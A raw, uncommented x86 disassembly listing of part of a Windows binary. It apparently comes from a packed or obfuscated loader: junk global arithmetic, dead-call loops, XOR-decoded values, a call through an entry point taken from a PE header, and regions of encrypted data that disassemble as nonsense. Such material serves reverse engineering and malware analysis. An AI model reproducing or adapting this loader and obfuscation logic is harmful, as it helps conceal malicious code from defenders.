  40d858:	adc    cl,BYTE PTR [edi+0x74]
  40d85b:	dec    ebx
  40d85c:	mov    bl,0xa1
  40d85e:	pop    ebx
  40d85f:	xchg   ebx,eax
  40d860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d861:	sub    al,0xc5
  40d863:	cmp    al,0x23
  40d865:	mov    ebx,0xe4ee68b2
  40d86a:	retf   0xb554
  40d86d:	into   
  40d86e:	stos   DWORD PTR es:[edi],eax
  40d86f:	sbb    edi,DWORD PTR [edi-0xf82fc68]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x30ee2fbc]
  40e122:	in     eax,0x25
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e0bd
  40e12d:	sbb    ah,BYTE PTR [ecx+ebp*1-0x59]
  40e131:	sub    dh,al
  40e133:	call   0x46d98f69
  40e138:	fwait
  40e139:	jp     0x40e109
  40e13b:	lods   eax,DWORD PTR ds:[esi]
  40e13c:	data16 fstp st(0)
  40e13f:	rol    WORD PTR es:[ebx+0x1b],cl
  40e144:	mov    dl,0x43
  40e146:	sbb    al,0x28
  40e148:	xor    edi,DWORD PTR [esi-0xd]
  40e14b:	jge    0x40e174
  40e14d:	cmp    esi,ebx
  40e14f:	les    edx,FWORD PTR [ebp-0x560da068]
  40e155:	stos   DWORD PTR es:[edi],eax
  40e156:	xor    al,ch
  40e158:	pop    edx
  40e159:	push   ebp
  40e15a:	loop   0x40e177
  40e15c:	dec    ebx
  40e15d:	mul    BYTE PTR [eax+0x843d2c4]
  40e163:	repnz test ebp,ebp
  40e166:	xor    ebp,eax
  40e168:	adc    eax,0xbe6d2b7a
  40e16d:	push   eax
  40e16e:	push   0x4c4ea96a
  40e173:	xor    esi,DWORD PTR [eax+0x22]
  40e176:	lea    esi,[ebx]
  40e178:	out    dx,eax
  40e179:	cld    
  40e17a:	pop    edx
  40e17b:	int3   
  40e17c:	add    BYTE PTR [edx],ah
  40e17e:	mov    al,0x17
  40e180:	dec    ebx
  40e181:	das    
  40e182:	ins    DWORD PTR es:[edi],dx
  40e183:	pushf  
  40e184:	jecxz  0x40e1cb
  40e186:	cs mov bh,0x22
  40e189:	jmp    0x5a4f:0x1a78a41e
  40e190:	cmp    ebx,esi
  40e192:	add    esp,DWORD PTR [ebx]
  40e194:	icebp  
  40e195:	(bad)  
  40e196:	dec    edi
  40e197:	(bad)  
  40e198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e199:	aam    0x1d
  40e19b:	jmp    0xda5e:0x11bc62b7
  40e1a2:	cmp    DWORD PTR [ebx-0x4e],0x8a931a4c
  40e1a9:	xlat   BYTE PTR ds:[ebx]
  40e1aa:	inc    esi
  40e1ab:	pop    esp
  40e1ac:	sub    eax,0x748d9646
  40e1b1:	ret    
  40e1b2:	or     al,cl
  40e1b4:	pop    ss
  40e1b5:	daa    
  40e1b6:	dec    eax
  40e1b7:	push   edx
  40e1b8:	popf   
  40e1b9:	add    eax,0xcd391ab
  40e1be:	cs jecxz 0x40e14a
  40e1c1:	jb     0x40e206
  40e1c3:	pop    ebp
  40e1c4:	fcomi  st,st(1)
  40e1c6:	fwait
  40e1c7:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40e1c9:	xor    BYTE PTR [ecx+ecx*8+0x540efdbe],0x81
  40e1d1:	adc    al,0xc4
  40e1d3:	lods   eax,DWORD PTR ds:[esi]
  40e1d4:	push   0xca13b5f4
  40e1d9:	data16 fwait
  40e1db:	push   ebp
  40e1dc:	call   0xe04e07d4
  40e1e1:	mov    bh,0x34
  40e1e3:	xor    eax,0x75495300
  40e1e8:	leave  
  40e1e9:	ret    
  40e1ea:	or     BYTE PTR [edx+0x17],al
  40e1ed:	dec    esp
  40e1ee:	dec    eax
  40e1ef:	dec    esi
  40e1f0:	inc    ecx
  40e1f1:	pop    ecx
  40e1f2:	std    
  40e1f3:	lock fwait
  40e1f5:	ja     0x40e1ba
  40e1f7:	shl    DWORD PTR [eax-0x2],1
  40e1fa:	push   0xffffffa0
  40e1fc:	xchg   DWORD PTR [ecx+0x26],esi
  40e1ff:	daa    
  40e200:	dec    eax
  40e201:	arpl   WORD PTR [esi-0x71],di
  40e204:	mov    ebp,0x53cbcaea
  40e209:	(bad)  
  40e20a:	sbb    BYTE PTR [edi-0x37c32],cl
  40e210:	call   0x1c401d25
  40e215:	inc    ebx
  40e216:	popf   
  40e217:	pop    ebp
  40e218:	test   eax,0x97f1c137
  40e21d:	fld    QWORD PTR [esi]
  40e21f:	shl    DWORD PTR [esi+0x7c824356],cl
  40e225:	inc    ecx
  40e226:	hlt    
  40e227:	std    
  40e228:	lods   al,BYTE PTR ds:[esi]
  40e229:	add    eax,0xe20dabac
  40e22e:	cmp    al,0xaf
  40e230:	cwde   
  40e231:	jno    0x40e22b
  40e233:	mov    al,ds:0x6def00b6
  40e238:	test   eax,0xe10f8472
  40e23d:	dec    edi
  40e23e:	cwde   
  40e23f:	push   0xba6a8ec6
  40e244:	sahf   
  40e245:	adc    BYTE PTR [ebp+0x6eee5b33],ch
  40e24b:	or     eax,0x6c8c194
  40e250:	es push edi
  40e252:	imul   esi,DWORD PTR [esi-0x7c],0x12
  40e256:	mov    esi,0x77edcc9f
  40e25b:	aad    0x77
  40e25d:	mov    bh,0xcc
  40e25f:	div    DWORD PTR [ebx+0x271a8b59]
  40e265:	xchg   ebx,eax
  40e266:	mov    ds:0xd9b94707,eax
  40e26b:	push   eax
  40e26c:	jb     0x40e238
  40e26e:	pop    edx
  40e26f:	out    dx,al
  40e270:	mov    ds:0x7441e99c,al
  40e275:	sub    dl,BYTE PTR [ebp-0x20]
  40e278:	fimul  WORD PTR [ecx-0x3ba72ff]
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
